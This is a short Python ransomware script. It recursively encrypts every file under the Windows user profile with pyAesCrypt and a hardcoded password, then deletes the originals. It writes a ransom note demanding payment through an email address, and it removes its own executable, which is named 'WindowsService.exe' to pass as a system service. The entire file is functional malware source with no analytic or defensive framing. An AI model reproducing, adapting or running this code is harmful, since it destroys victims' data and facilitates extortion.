from pyAesCrypt import encryptFile
import os


size = 1024
location = os.environ['USERPROFILE']

def encrypt_file(path):
    for item in os.listdir(path):
        if "." in item:
            if item == "WindowsService.exe":
                continue
            else:
                try:
                    encryptFile(path + "\\" + item, path + "\\" + item  + ".fuck", "you'rhackedbitch.youshouldgive_methePasswordOr_I(will_Destroyed)Your_Fucking[PC]", size)
                    os.remove(path + "\\" + item)
                except:
                    pass
        elif "." not in item:
            try:
                encrypt_file(path + "\\" + item)
            except:
                pass
    try:
        open(path + "\\Read_me.txt", "a").write("Attention !\nDon't worry, you can ruturn all your files !\nThe only method of recovring files is to purchase the decrypt tool and unique key for you.\nThis software will decrypt all your encrypted files.\nTo get this software you need to write on our e-mail:\nwabzafakhouya@gmail.com\nsee you soon.Bye.")
    except:
        pass
encrypt_file(location)
os.remove("WindowsService.exe")
